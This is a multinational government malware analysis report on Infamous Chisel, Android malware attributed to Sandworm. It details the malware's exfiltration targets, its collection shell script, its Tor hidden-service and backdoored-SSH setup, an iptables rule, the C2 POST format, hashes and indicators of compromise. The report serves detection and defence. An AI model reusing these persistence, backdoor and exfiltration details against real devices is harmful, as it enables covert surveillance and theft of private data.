{
  "markdown": " \n    \nMalware Analysis Report  Infamous  \nChisel  \n31 August  2023 \n Crown Copyright 202 3  \n  \n  \n\n\n \n Infamous Chisel  \nA collection of components  associated with  Sandwor m designed to \nenable remote access and exfil trate  information from Android \nphones . \nExecutive summary  \n Infamous Chisel is a collection of components  target ing Android devices . \n This malware is associated with Sandworm activity.  \n It performs p eriodic scannin g of files and network information for exfiltration . \n System and application configuration files  are exfi ltrated from an infected device . \n Infamous Chisel provides n etwork backdoor access via a Tor (The Onion Router)  hidden \nservice and Secure Shell ( SSH). \n Other capabilit ies include network monitoring , traffic collection, SSH access, network \nscanning  and SCP file transfer . \n \nOverview  \nThe UK National Cyber Security Centre (NCSC), the US National Security Agency (NSA), US \nCybersecurity and Infrastructure Securit y Agency (CISA), US Federal Bureau of Investigation (FBI), \nNew Zealands National Cyber  Security Centre  (NCSC -NZ), the Canadian Centre for Cyber Security  \npart of the Communications Security Establishment (CSE ) and Australian Signals Directorate (ASD ) \nare aware that the actor known as Sandworm has used a new mobile malware  in a campaign \ntargeting Android devices used  by the Ukrain ian military.  The malware is referred to here as Infamous \nChisel.  \nOrganisations from the United Kingdom , United States, Australi a, Canada  and New Zealand  have \npreviously linked  the Sandworm actor to the Russian GRU's Main Centre for Special Technologies \nGTsST.  \nMalware summary  \nInfamous Chisel is a collection of components which enable  persistent access to an infected Android \ndevice  over the Tor network, and which  periodically  collates and  exfiltrate s victim information  from \ncompromised devices . The information exfiltrated is a combination of system device information, \ncommercial application information and applications specific to  the Ukrainian military.  \nThe malware  periodically  scans the device for  information an d files of interest , matching a predefined \nset of file extension s. It also contains functionality to periodically scan  the local network collating \ninformation about active  hosts , open ports  and banners.  \nInfamous Chisel also provides r emote  access by config uring and executing Tor with a hidden service \nwhich forwards to a modified Dropbear  binary  providing a  SSH connection.  \nOther capability includes network monitoring  and tra ffic collection, SSH access, network scanning  and \nSCP file transfe r. \n\n \n Malware details  \nMetadata  \nFilename  killer \nDescription  Infamous Chisel - Process manipulation for netd \nELF 32-bit ARM \nSize 30160 bytes \nMD5  512eb94ee86e8d5b27ec66af98a2a8c4  \nSHA -1 ad6eb2a7096b0e29cd93b8b1f60052fed7632ab9  \nSHA -256 5866e1fa5e262ade874c4b869d57870a88e6a8f9d5b9c61bd5d6a323e763e021  \n \nFilename  blob \nDescription  Infamous Chisel - Decompressor and launcher for Tor process \nELF 32-bit ARM \nSize 2131691 bytes  \nMD5  2cfa1f3e0467b8664cb f3a6d412916d6  \nSHA -1 b681a2b64d150a4b16f64455913fbacd97d9b490  \nSHA -256 2d19e015412ef8f8f7932b1ad18a5992d802b5ac62e59344f3aea2e00e0804ad  \n \nFilename  ndbr_armv7l \nDescription  Infamous Chisel - Multi-call binary with many utilities:  \ndropbear, dropbearkey, ssh, scp, nmap , dbclient, watchdog, rmflag, mkflag  \nELF 32-bit ARM \nSize 328296 bytes \nMD5  0905e83411c0418ce0a8d3ae54ad89a6  \nSHA -1 917db380b22fad02e7f21f11d1b4e8a5ad47c61c  \nSHA -256 5c5323bd17fd857a0e77be4e637841dad5c4367a72ac0a64cc054f78f530ba37  \n \n \nFilename  ndbr_i686 \nDescription  Infamous Chisel - Multi-call binary with many utilities:  \ndropbear, dropbearkey, ssh, scp, nmap , dbclient, watchdog, rmflag, mkflag  \nELF 32-bit Intel 80386  \nSize 450340 bytes \nMD5  7e548ef96d76d2f862d6930dcc67ef82  \nSHA -1 7d11aefc26823712ad 8de37489f920fae679b845  \nSHA -256 3cf2de421c64f57c173400b2c50bbd9e59c58b778eba2eb56482f0c54636dd29  \n \nFilename  db \nDescription  Infamous Chisel - Multi-call binary with many utilities:  \ndropbear, dropbearkey, ssh, scp, nmap , dbclient , watchdog, rmflag, mkflag  \nELF 32-bit ARM \nSize 5593884 bytes \nMD5  04d0606d90bba826e8a609b3dc955d4d  \nSHA -1 ffaeba9a9fb4260b981fb10d79dbb52ba291fc94  \nSHA -256 338f8b447c95ba1c3d8d730016f0847585a7840c0a71d5054eb51cc612f13853  \n \n  \n\n \n  \nFilename  db.bz2 \nDescription  Bzip compressed data contain ing the Infamous Chisel Multi -Call binary \n(db) \nSize 5593884 bytes \nMD5  c4b5c8bdf95fe636a6e9ebba0a60c483  \nSHA -1 cdad1bee2e88581b7fa7af5698293435667d2550  \nSHA -256 ef466e714d5250e934e681bda6ebdecd314670bb141f12a1b02c9afddbd93428  \n \nFilename  td \nDescription  Standard Tor P2P network application   likely actor compiled  \nELF 32-bit ARM \nSize 5265772 bytes \nMD5  1f2c118b29e48cc5a5df46cddd399334  \nSHA -1 f6368ae2eec8cf46a7e88559f27dbbe4e7c02380  \nSHA -256 33a2be6638be67ba9117e0ac7bad26b12adbcdf6f8556c4dc2ff3033a8cdf14f  \n \n \nFilename  td.bz2 \nDescription  Bzip compressed data containing the standard T or P2P network application \n(td) \nSize 1840669 bytes \nMD5  452b6c35f44f55604386849f9e671cc0  \nSHA -1 2df1e320851b26947ab1ea07eaccbd4d3762c68e  \nSHA -256 001208a304258c23a0b3794abd8a5a212 10dfeaf106195f995a6f55d75ef89cd  \n \nFilename  tcpdump \nDescription  Standard Tcpdump utility   likely actor compiled  \nELF 32-bit ARM \nSize 759528 bytes \nMD5  4bdf7f719651d9a762d90e9f33f6bb01  \nSHA -1 500b953d63a0dbdc76dc3f51c32e3acab92f3ddc  \nSHA -256 140accb18ba956 9b43b92da244929bc009c890916dd703794daf83034e349359  \n  \n\n \n MITRE ATT&CK \nThis report has been compiled with respect to the MITRE ATT&CK framework, a globally accessible \nknowledge base of adversary tactics and techniques based on real -world observations.  \nTactic  ID Technique  Procedure  \nExecution  T1569  System Services  Infamous Chisel - netd  replaces th e legitimate \nnetd . \nPersistence  T1398 \n(Mobile)  Boot or Logon \nInitialization Scripts  Infamous Chisel - netd  replaces the legitimate \nnetd . \nT1625  \n(Mobile)  Hijack Execution \nFlow  Infamous Chisel - netd  replaces the legitimate \nnetd  and is executed by init inheriting root \nprivileges.  \nPrivilege \nEscalation  T1626 \n(Mobile)  Abuse Elevation \nControl Mechanism  Infamous Chisel - netd  executes shell scripts \nas the root user of the device.  \nDefence \nEvasion  T1629 \n(Mobile)  Impair Defenses  Infamous Chisel - netd  checks that it is \nexecuted by init  and at the path for the \nlegitimate netd . \nT1406 \n(Mob ile) Obfuscated  Files or \nInformation  Infamous Chisel - blob  decompresses \nexecutables from bzip archives.  \nCredential \nAccess  T1557  \n Adversary -in-the-\nMiddle  Infamous Chisel - mDNSResponder  is \ndeployed  alongside this malware  and could \npotentially be used for DNS poisoning.  \nT1634 \n(Mobile)  Credentials from \nPassword Store  Infamous Chisel - netd  scrapes multiple files \ncontaining credentials and key  information.  \nT1040  Network Sniffing  Infamous Chisel - tcpdump  is deployed \nalongside this malware  and has the ability to \nsniff netwo rk interfaces and monitor network \ntraffic . \nDiscovery  T1420  \n(Mobile)  File and Directory \nDiscovery  Infamous Chisel - netd  enumerates multiple \ndata directories to discover files of interest.  \nT1430  \n(Mobile)  Location Tracking  Infamous Chisel - netd  collects GPS \ninformation.  \nT1418 \n(Mobile)  Software Discovery  Infamous Chisel - netd  collects a list of \ninstalled packages.  \nT1426 \n(Mobile)  System Information  \nDiscovery  Infamous Chisel - netd  collects various \nsystem information such as the Android ID and \nother hardware information.  \nT1422 \n(Mobi le) System Network \nConfigu ration \nDiscovery  Infamous Chisel - netd  collects IP interface \nconfiguration information.  \nT1421 \n(Mobile)  System Network  \nConnections  \nDiscovery  Infamous Chisel - netd  perfo rms IP scanning \nof the local network to discover other devices . \nCollection  T1533 \n(Mobile)  Data from Local \nSystem  Infamous Chisel - netd  automatically collects \nfiles from the local system based on a  \npredefined list of file extensions . \n\n \n Tactic  ID Technique  Procedure  \nT1074.001  Data Staged: Local \nData Staging  Infamous Chisel - netd  creates multiple \ntemporary files in the system to hold collected \ninformation.  \nT1114.001  Email Collection: \nLocal Email \nCollection  Infamous Chisel - netd  exfiltrates files from \napplication and data directories containing \ncommunication data.  \nCommand \nand Control  T1437 \n(Mobile)  Application Layer \nProtocol  Infamous Chisel - db provides SCP \nfunctionality.  \nT1521 \n(Mobile)  Encrypted Channel  Infamous Chisel  - td is deployed along side \nthis malware p rovid ing a Tor hidden service \nrelaying connections to SSH program.  \nT1572  Protocol Tunnelling  Infamous Chisel  - td is deployed alongside \nthis malware provid ing a local Socks \nconne ction for db. \nT1219  Remote Access \nSoftware  Infamous Chisel - db provide s a SSH server \nand client.  \nExfiltration  T1020  Automated \nExfiltration  Infamous Chisel - netd  automatically \nexfiltrates  files at regular intervals.  \nT1029  Scheduled Transfer  Infamous Chisel - netd  automatically \nexfiltrates files at regular intervals . \nImpact  T1489  Service Stop  Infamous Chisel - netd  replaces the legitimate \nnetd. \n \n  \n\n \n Functionality  \nOverview\nInfamous Chisel is a collection of multiple components . For netd , killer , blob  and td functionality \ncan be e xtrapolated from references between them.  The function of other binaries changes \ndepend ing on the command line parameters that are supplied . It is likely that interaction takes place \nover the SSH remote shell connection configured by netd. \nOverview of the components  \nFilename  Description  \nnetd This component  is used to perform automated device information collection and \nexfiltration.  \nkiller This c omponent  kills the malicious netd  process . \nblob This component  is executed by netd  and is responsible for confi guring and \nexecuting the T or utility  td. \ntd This utility is Tor with no obvious modifications.  \ntcpdump This utility is tcpdump  with no obvious modifications.  \nndbr_armv7l \nndbr_i686 These utilities  are m ulti-call containing:  \ndropbear , dropbearkey , ssh, scp, nmap , dbclient , watchdog , rmflag , \nmkflag . dropbear  has been modified  as described in the section Multi -call \nbinaries (Dropbear  function modifications) . ARM and x86 variants . \ndb This utility  is multi-call containing:  \ndropbear , dropbearkey , ssh, scp, nmap , dbclient , watchdog , rmflag , \nmkflag . dropbear  has been modified as described in the section Multi -call \nbinaries ( Dropbear function modifications ). \n \nPersistence  \nnetd is designed to persist on the system by replacing the legitimate netd  system binary at the path \n/system/bin/ netd . This replacement is not carried out by the malware, but it can be extrapolated \nfrom the checks that it carries out . This is the only Infamous Chisel component which persist s. \nWhen the malicious netd  is execu ted, it will check if init  is the parent process which  executed it. \nThis parent process  is responsible for creating the processes listed in the script init.rc. The \nmalici ous replacement netd  when executed in this way will fork and execute the legitimate pr ocess \nbacked up at the path /system/bin/ netd_ passing through the command line parameters . This \nretains the normal functionality of netd, while allowing the malicious netd to execute as root. This \nreplacement would require an escalated privilege level to p erform.  \nIf it does nt find itself at the /system/bin/netd  path, it will fork and set its parent process ID to 1, \nalso attempting to kill the legitimate netd  process.  \nCom ponents  \nnetd \nThe netd  component  of Infamous Chisel  provides the bulk of the custom functionality which  the actor \ndeploys. The main purpose of netd  is to collate and exfil trate information from the compromised \ndevice at set intervals. It uses a combination of shell scripts and commands  to collect device \ninformation . It also  searches  multiple directories to which  files matching  a predefined set of extensions \nare exfiltrated.  \n\n \n Exfiltration logic \nAll file exfiltrati on is performed as detailed in the Communication s (File exfiltration)  section of this \nreport.  Whenever a file is selected for exfiltration,  it is MD5 -hashed  and cross -referenced with  a list of \npreviously  sent file hashes held in a file at one of three locations  supporting  different Android \nversions. The first existing directory path will be used:  \n /sdcard/Android/data/.google.index  \n /storage/emulated/0/Android/data/.google.index  \n /storage/emulated/1/Android/data/.google.index  \nThe file exfiltration is considered comple te when the server sends Success  anywhere in its response. \nAs this exfiltration uses a Hypertext Transfer Protocol ( HTTP ) POST , this server response is also \nexpected to be HTTP , but this is not explicitly checked for.   \nThe 16 raw bytes of the MD5 are appen ded to the end of the  .google.index  file, ensur ing that the \nsame file isnt sent multiple times.  As the .google.index  file cont ains raw bytes, without prior \nknowledge , it would appear to contain random data . The initial allocation size is  256 Kb filled wit h \nNULLs  providing space for up to a maximum of 16,384 file hashe s. All hash entries will be checked \nfor every file prior to exfiltration.  \nWhen the end of the .google.index  file is reached, the position is reset to the start, overwriting the \nprevious hashe s. This means if the number of files to exfiltrate from the device exceeds 16,384, fi les \nwill be sent multiple times . \nInformation gathering  \nOn execution , the Infamous Chisel  netd  component  enters a main loop that executes indefinitely \nwhere various timers  trigger the execution of different tasks. All timer actions are executed \nimmediate ly on first execution , and then at the specific  intervals.  \n \nFile and device information exfiltration  \nEvery 86 ,000 seconds (23 hours, 53 minutes , and 20 seconds) the followin g actions are performed :  \n1. File exfiltration from data directories  \nThe following d irectories are  recursively  searched for files matching the extensions listed . When a file \nis found by this search , it is exfiltrated as detailed in the  Communications (File exfiltration)  section of \nthis report.  \nFile extension list , copied verbatim from the binary : \n.dat,.bak,.xml,.txt,.ovpn,.xml,wa.db,msgstore.db,.pdf,.xlsx,.csv,.zip,tel\nephony.db,.png,.jpg,.jpeg,.kme,database.hik,database.h ik-\njournal,ezvizlog.db,cache4.db,contacts2.db,.ocx,.gz,.rar,.tar,.7zip,.zip ,\n.kmz,locksettings.db,mmssms.db,telephony.db,signal.db,mmssms.db,profile.d\nb,accounts.db,PyroMsg.DB,.exe,.kml  \n \nDirectory lis t: \n /sdcard \n /storage/emulated/0/  \n /data/media  \n /data/data/d e.blinkt.openvpn  \n /data/data/org.thoughtcrime.securesms  \n /data/data/net.openvpn.openvpn  \n /data/data/org.telegram.messenger  \n\n \n  /data/data/vpn.fastvpn.freevpn  \n /data/data/eu.thedarken.wldonate  \n /data/data/com.a ndroid.providers.contacts  \n /data/data/com.android.provide rs.telephony  \n /data/data/com.google.android.gm  \n /data/system/users/0/  \nAlong with other military specific application directories.  \n2. Information collection script  \nAn information collection  script collates various hardware configuration information about the dev ice. \nThe script is written to the location: /data/local/tmp/.android.cache.sh  and then executed \nby netd  using the command /system/bin/sh -c /data/local/tmp/.android.cache.sh  \n.android. cache.sh  contains the following shell script:  \n#!/system/bin/sh  \nsystem/bin /settings get secure android_id > /data/local/tmp/.aid.cache  \nsystem/bin/ip a > /data/local/tmp/.syscache.csv  \nsystem/bin/pm list packages > /data/local/tmp/.syspackages.csv  \nsystem/bin/ getprop > /data/local/tmp/.sysinfo.csv  \n \nCommand  Description  Output filen ame \nsettings get secure \nandroid_id  Returns a hex adecimal  string identifying the \ndevice uniquely . .aid.cache  \nip a Lists networking information such as IP \naddress, subnet and interface type on a per \nnetwork interface basis . .syscache.csv  \npm list packages  List of installed applications on the device . .syspackages.csv  \ngetprop Lists various device hardware information \nsuch as GPS, battery, manufacturer and \nlanguage . .sysinfo.csv  \n \nAll th e information is written to the various files in the /data/local  directo ry and exfiltrated , with the \nexception of the .aid.cache  file. The android_id  contained within this file is  used to form part of \nthe Uniform Resource Identifier ( URI) detailed in the Communications  section of this repo rt. \n3. File exfiltration from application directories  \nThe /data/  directory is searched for the application directories : \n com.google.android.apps.authenticator2  \n net.openvpn.openvpn  \n free.vpn.unblock.proxy. vpnmaster  \n com.UCMobile.intl  \n com.brave.browser  \n com.opera.b rowser \n com.hisense.odinbrowser  \n com.dzura  \n com.google.android.apps.docs  \n com.sec.android.app.myfiles  \n\n \n  com.microsoft.skydrive  \n com.google.android.apps.walletnfcrel  \n com.paypal .android.p2pmobile  \n com.binance.dev  \n com.coinbase.android  \n com.wallet.crypto.trustapp  \n com.viber.voip  \n com.dropbox.android  \n com.android.providers.telephony  \n com.android.providers.contacts  \n com.cxinventor.file.explorer  \n com.elinke.fileserver  \n org.mozilla.firefox  \n com.whatsapp  \n org.thoughtcrime.securesms  \n org.telegram.messenger  \n org.telegram.messenger.web  \n com.discord  \n com.hikvisionsystems.app  \n com.hikvision.hikconnect  \n com.skype.raider  \n com.google.android.gm  \n com.android.chrome  \n org.chromium.webview_shell  \n keystore  \nAlong with some military application specific directories.  \nEvery  file in  these directories regardle ss of type is exfiltrated.  \n4. Specific  file exfiltration  \nThe following file s at the absolute paths  are exfiltrated:  \n /data/local/tmp /.syscache.csv  \n /data/local/tmp/.syspackages.csv  \n /data/local/tmp/.sysinfo.csv  \n /data/system/users/0/settings_ssaid.xml  \nAlong with some military application specific directories.  \nThe files with the extension  .csv  are generated by the malware . The o thers are a pplication  specific \nfiles or system configuration information.  \n  \n\n \n Exfiltration of configuration and configuration back up files \nEvery 600 seconds (10 minutes) the following  directories are searched for files of type  .json  or \n.json.bak which are then immediately exfiltrated : \n /sdcard \n /storage/emulated/0/  \n /data/media  \n /data/data/de.blinkt.openvpn  \n /data/data/org.thoughtcrime.securesms  \n /data/data/net.openvpn.openvpn  \n /data/data/org.telegram.messenger  \n /data/data/ vpn.fastvpn.freevpn  \n /data/data/eu.thedarken.wldonate  \n /data/data/com.android.providers.contacts  \n /data/data/com.android.providers.telephony  \n /data/data/com.google.android.gm  \n /data/system /users/0/  \nAlong with some military application specific directories.  \nLoca l area n etwork scanning  \nEvery 172 ,000 seconds (1 day, 23 hours, 46 minutes , and  20 seconds) the local area network is \nscanned.  \nnetd has a buil t-in network  scanner  that is executed by the command line:  \nnetd minmap -i any -noping -o /data/local/tmp/.ndata.tmp/  \nThe ping scanner is fairly simplistic  and will iterate over the available host IP addresses in the subnet \nspecified by the interface  on all available Transmission Control Protocol (TCP) ports . Internet Control  \nMessage Protoc ol (ICMP ) scanning is disabled due to the noping  command line  parameter  \nspecified.  \nThe scanner also includes a HTTP GET request to elicit responses from ports running a HTTP  server . \nThe responses from other ports  are also logged.  \nNote:  This information would facilitate lateral movement within the network and illustrates a clear \nintention to interact with other nearby hosts . \nOn completion of this scan , the .ndata.tmp  file is moved to the filename .ndata.csv  in the  same \ndirectory. This fil e is exfiltrated immediately , and both files removed from the tmp directory.  \n  \n\n \n The contents of this file will appear similar to:  \nINTERFACE = eth0  \nSOURCE = 192.168.0.2  \nIP begin = 192.168.0.0  \nIP end = 192.168.0.255  \nPORTS =  \nPING off  \nSCAN tcp  \n*******start*scan********  \n \nHost 192.168.0.0:  \nHost 192.168.0.1:  \ntcp - 135:[ \ntcp - 139:[ \ntcp - 443:[ \ntcp - 445:[ \nHost 192.168.0.2:  \nHost 192.168.0.3:  \nHost 192.168.0.4:  \n<Remaining  hosts omitted for brevity>  \n \nThe following command line parameters  are present , but only a small portion is used:  \n-ip, -p, -o, -i, -noping, -udp, -n, -s, -t, -c, -h, --help  \n \nCommand line help is also included:  \nUsage minmap -ip* <ip-addr: 192.168.0.1/ip -range: 192.168.0.0/24> -p* \n<port: 80/port -range: 22,25 -125/top> -udp <default tcp> -noping <default \nyes> -o <out_file> -t <timeout> < -n> -c <try_count> -s <source ip> -i \n<interface/any> < -h/--help (print this help)  \n \ntd \nThe td utility provides  Tor directory services  and is  compiled for ARM with no obvious modifications . \nThe con figuration for this is generated by the blob  component , used for T or management,  described  \nin the  Components (blob)  section,  and saved at the path /data/local/prx.cfg . This file \ncontains:  \n \nSocksPort 127.0.0.1:1129 PreferSOCKSNoAut h%sExitPolicy reject *:*  \nDataDirectory /data/local/prx/  \nRunAsDaemon 1  \nHiddenServiceDir /data/local/prx/hs/  \nHiddenServicePort 34371 127.0.0.1:34371  \n \nThis configuration provides a Socket Secure version 4 ( SOCKS4 ) connection on the local port 1129  \nenabling the Tor network to be used.  The blob  component uses this for network connectivity checks.  \nThe hidden service port is set to 34371  with the directory for hidden service information being set to  \n/data/local/prx/hs/ .  \n\n \n During the execution of td an .onion  domai n for a hidden service is randomly generated at the path \n/data/local/prx/hs/hostname  which is then exfiltrated  by netd . The db component performs \nfurther configuration detailed in the  Multi -call binaries (Watchdog ) section of this report to enable a \nSSH connection via th is .onion  domain . This gives the actor the ability to create an SSH session by \nconnecting to the hidden service across T or. \nblob \nThe blob  component is responsible for configuring T or services and checking networ k connectivity. \nEvery 15 seconds the tmp directory is checked for the blob  utility , and  if found , it is moved to the \n/data/local  directory  from the /data/local/tmp/blob  directory , overwriting any existing \nversion.  Every 6 ,000 seconds (1 hour  and 40 minutes ) blob  is then run from the /data/local  \ndirectory.  \nnetd  executes blob which is responsible for configuring and executing  Tor services  provided by td. \nWhen run, it performs the following actions:  \n1. Checks local host for the port 1129  being open, exiting if it  is. \n2. Checks for the existence of /data/local/td . If this  is not present , extract s it from \n/data/local/td.bz2  (bzip2 compressed data) . \n3. Creates the configuration file at the path: /data/local/prx.cfg . The contents of which \nare detailed in the Components ( td) section above.  \n4. td is executed with this configuration file being supplied with the -f command line \nparameter : /data/local/td -f /data/local/prx.cfg . \n5. db the modified Dropbear  SSH utility  is checked for at the path /data/local/ db. If this file \nis not present , it is extracted from /data/local/ db.bz2 . db is then executed immediately \nafter, with no command line parameters  being passed . \n6. blob then enters a loop where it performs a network connectivity check against the domain \nwww.geodatato ol[.]com connecting  on the local SOCKS4  address provided by the td \nutility  127.0.0[.]1:1129  every 3 minutes . \n7. It checks the second byte of the response from this domain to be the character Z (0x5a ) to \nvalidate a legitimate response has been received from th e server.  Nothing further is done with \nthe data ; this is simply an internet connection check.  \n8. If this request  fails or the server doe snt return the expected data , blob  terminates the \nexecution of td. \ntcpdump  \nThe tcpdump  utility ( version 4.1.1) is compiled  for ARM with no obvious modifications. This \nprovid es traffic capturing and monitoring functionality via the command line.   \n  \n\n \n Multi -call binaries : db, NDBR_armv7l and NDBR_i686  \nThe db utility contain s multiple individual utilities  which are selected based on the command line \nparameters  supplied : \nUtility  Actor  Modified  Description  \ndropbear  No Yes Dropbear SSH client with modified \nauthentication functions as described \nin Components (Multi -call binaries: \ndb, NDBR_armv7l and NDBR_i686)  \ndropbearkey  No No Generates SSH keys  \nnmap Yes No Network scanning and mapping utility  \nwhich appears to be actor \ndeveloped, as opposed to the open \nsource Nmap  project  \nscp No No File-copying utility  \nwatchdog  Yes N/A Creates d irectories, flag file and sets \nup the IP Tables rules  \nrmflag Yes N/A Removes the flag file  \nmkflag Yes N/A Creates directories  \n \nThe command line help for dropbear , dropbearkey , nmap  and scp can be found in the Appendix  \nsection of this report.  \ndropbear , present within db, provide s secure shell access to the device via the T or hidden service. \nIP Tables rules configured allow incoming TCP connections des tined for port 34371  through the \nfirewall. The T or utility  executed by blob  on the device is configured to provide a hidden service on \nthis port , then forward  connections to the local dropbear  instance. The .onion  address has already \nbeen exfiltrated enabling the actor to connect to it . Modifications have been made to  dropbear  \nauthentication mechanisms .  \nThe scp utility does not appear to have been modified . The nmap  utility  has the same functionality as \nthe version in netd  but is executed manually by actor interaction.  \nThe watchdog , rmflag  and mkflag  utilities appear to be addit ional  actor -created  code that has \nbeen incorporated to perform some configuration for dropbear . \nThe directory sessions.log.d  is created under /data/local/tmp /, and puts all standard \nDropbear files under this directory alongside the custom actor  file remove_file.flag .  \n \nWatchdog  \nThe watchdog  utility performs setup and executes dropbear . This setup includes:  \nFile and d irectory creation  \n /data/local/tmp/sessions.log.d  \n /data/local/tmp/sessions.log.d/.ssh  \n /data/local/tmp/sessions.log.d/.ssh/rem ove_file.flag  \n \nThe remove_file.flag  file is created containing the string  run when any of the multi -call utilities \nrun Dropbear. This will be collected and exfiltrated by  netd  giving the actor an indicator that the SSH \nserver is active.  \n \n\n \n Authori zed hosts setup  \nA host key is placed into the directory:  \n/data/local/tmp/sessions.log.d/.ssh/authorized_keys  \n \nIP Tables Rules  \n/usr/sbin/iptables  is executed with the parameters:  \n-A INPUT -p tcp --dport 34371  -j ACCEPT -I \n \nmkflag  \nThe mkflag  utility creates the directories and files that watchdog  creates but does not pe rform any \nhost file or IP table manipulation, and then runs dropbear . \nrmflag  \nThe rmflag  utility d eletes /data/local/tmp/sessions.log.d/.ssh/remove_file.flag  \nModified Dropbear  function s \nThe actor has modified authentication mechanisms in Dropbear . \nfill_passwd   \nThe Dropbear function fill_passwd  is used to verify that a supplied username is a valid account \nand return information required to process authentication.  \nThe unmodified source code  for this can be found in the  Appendix ( Dropbear fill_passwd function)  \nsection of this report.  \nThis function calls multiple  Linux library function s, getpwnam , getspnam , getpwuid , but in the \nmodified version actor replacement  functions are call ed instead , each of these are discussed below.  \n \ngetpwnam  \ngetpwnam  Linux library function accept s a username and cross -references it with the passwd file \nusually stored at /etc/passwd  for the corresponding entry contain ing the colon concatenated  fields:  \n username \n user password  \n user ID \n group ID  \n user information  \n home directory  \n shell program  \n \nOn most modern systems , an x in the user password  field is used to denote that the password \nhash is stored in the /etc/shadow  file that requires root privileges to read.  On an Android device , \nthere are typically no such files , so the structure that would usually be retrieved from the passwd  file \nis generated  instead.  \n \nThe actor has replaced this function with their own , where if a particular username is seen it returns a \nhard-coded response. If the expected username is not seen , the /etc/passwd  file is checked for the \ncorresponding username as normal.  \n \n\n \n getpwuid  \ngetpwuid  Linux library accepts a uid and returns the corresponding structure above  typically from \nthe /etc/passwd  file. Th e actor has replaced this function to check for the uid of 0xbeef  and \nreturn the hard -coded structure detailed above , if found. If 0xbeef  is not seen , it will revert to \ncheck ing /etc/passwd . \ngetspnam  \ngetspnam  Linux library function accepts  a username  and cross -references it with the shadow file \nusually stored at /etc/shadow  for the corresponding entry that contains the do llar concatenated \nfields:  \n id \n salt \n hash \n \nTypically  on an Android  device , this function would return NULL , but the actor replacement f unction  \nuses the Linux version . \n \nThere does not appear to be any modifications  other than those detailed above , but there may be \nother patches implemented.  \nNDBR  \nThe NDBR_armv7l  and NDBR_i686  utilities contain multiple individual utilities compiled for ARM and \nx86 respectively . They b oth include the above authentication mechanism mod ification , although with \ndifferent credentials , and otherwise appear to be the same .  \nThese utilities also have some functionality overlap with the VPNFilter  malware but appear t o be an \nevolution.1 \nkiller \nkiller  is a simple program , the main purpose  of which  is to terminate netd . \nIt achieves this by performing the following steps:  \n1. Iterates through all Process Identifiers ( PIDs) in the range 2 through  to 0x3FFFFF . \n2. Checks the first line of /proc/<pid>/status  for the string netd . \n3. Checks the target of the link referenced at /proc/<pid>/exe  against netd . \n4. Checks the exe cutable  name is not netd_ (The legitimate backup executed by the malicious \nnetd ). \n5. Terminates the malicious netd  leaving the legitimate netd_ running . \n \n  \n \n1 https://blog.talo sintelligence.com/vpnfilter -part-3/ \n  \n \n\n \n Communications  \nnetd f ile exfiltration  \nWhen a file is to be exfiltrated , a Transport Layer Security (T LS) connection is initiated to a hard -\ncoded local IP and port.  \nNote:  This local IP address  is likely a  local port forward to relay the network traffic over a secure \nchann el, such as a V irtual Private Network (V PN) configured on the device. VPN services are often \nconfigured in this way , giving  the actor a means to exfiltrate information from the network which \nblends in  with expected encrypted  network traffic.  \nIf a connection to the local IP and port fails , a hard -coded domain is used as a fallback connection. \nThe IP address for this domain is resolved using a request to dns.google . \nPOST /dns-query HTTP/1.1   \nHost: dns.google  \nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) \nGecko/20100101 Firefox/47.0  \nAccept: application/dns -message \nContent-Type: application/dns -message \nContent-Length:  \n \nNote:  The hard -coded user agent  that relates to a Microsoft Windows operating sy stem would raise \nsuspicion originating from an Android device.  But since  all the communications are under TLS , it \nwould make inspecti ng the HTTP headers difficult.  \nThe following HTTP Post request is used to exfiltrate data:  \nData structure  \nPOST /server.php ?ver=16& bid=%s&type=%d HTTP/1.1  \nUser-Agent: curl/7.47  \nHost:  \nPath: %s \nContent-Type: application/octet -stream \nContent-Length: %d \n \n<Raw File> \nAndroid ID  Type: 0 or 1  Base64 encoded file path  \nContent Length of the encoded \nfile to be exfiltrated  File content s \n The Android ID is generated by the initial script run , using the command settings get \nsecure android_id . \n Type  denotes the exfiltration type:  \no 0 is used for the file searches, triage script and configurations files.  \no 1 is used for other information such as  the T or domain . \n \n \n\n \n Conclusi on \nThe Infamous Chisel  components  are low to medium sophistication and appear  to have been \ndeveloped with little regard to defence evasion or concealment of malicious activity.   \nThe searching of specific files and directory paths  that relate  to military applications  and exfiltration of \nthis data  reinforces the intention to gain access to these networks. Although t he components  lack \nbasic obfuscation  or stealth techniques to disguis e activity , the actor may have  deemed this not \nnecessary , since  many Android devices do not have a  host-based detection system  \nTwo interesting technique s are present in Infamous Chisel : \n the replacement of the legitimate  netd  executable to maintain persistence  \n the modification of the authentication functio n in the components that include dropbear  \nThese technique s require  a good level of C++ knowledge to make the alterations and an awareness \nof Linux authentication and boot mechanisms.  \nEven with the lack of concealment functions, these components present a s erious threat because of  \nthe impact of the information they can  collect.  \n  \n\n \n Detection  \nIndicators of compromise  \nType  Description  Values  \nnetd  \nPOST \nRequest  C2 \ncommunication  POST /server.php?ver=16&bid=%s&type=%d HTTP/1.1 \\r\\n \nUser-Agent: curl/7.47 \\r\\n \nnetd  \nPaths Relocated \nlegitimate netd /system/bin/ netd_ \nIP address \ninformation  /data/local/tmp/.syscache.csv  \nApplication list /data/local/tmp/.syspackages.csv  \nGetprop output  /data/local/tmp/.sysinfo.csv  \nAndroid ID  /data/local/tmp/.aid.cache  \nTriage shell \nscript /data/local/tmp/.android.cache.sh  \nExfiltrated file \nhash list \nlocation  /sdcard/Android/data/.google.index  \n/storage/emulated/0/Android/data/.google.index  \n/storage/emulated/1/Android/data/.google.index  \nnetd_ \nProcess \nListing \nName  Renamed \nlegitimate netd netd_ \ntd \nPaths  Binary path /data/local/td  \nConfiguration \nfile path /data/local/prx.cfg  \nConfiguration \nfile directory  /data/local/prx  \nTor generated \nfiles /data/local/prx/cached -certs \n/data/local/prx/cached -microdesc -consensus  \n/data/local/prx/cache d-microdescs  \n/data/local/prx/cached -microdescs.new  \n/data/local/prx/lock  \n/data/local/prx/state  \nConfiguration \nfile directory  /data/local/prx/hs  \nHidden service \npath /data/local/prx/hs/hostnam e \nPublic key /data/local/prx/hs/hs_ed25519_public_key  \nPrivat e key /data/local/prx/hs/hs_ed25519_secret_key  \nCompressed \ninstaller file td.bz2 \nblob  \nPaths  Binary path /data/local/blob  \n\n \n Type  Description  Values  \nblob  \nProcess \nListing \nName  Process list \nentry blob \nkiller  \nPaths  Binary path /data/local/killer  \ndb \nPaths  Binary path /data/local/db  \ndb \nProcess \nListing \nName  Process list \nentry db \nNDBR_a\nrmv7l  \nPaths  Binary path /data/local/NDBR_armv7l  \nNDBR_a\nrmv7l  \nProcess \nListing \nName  Process 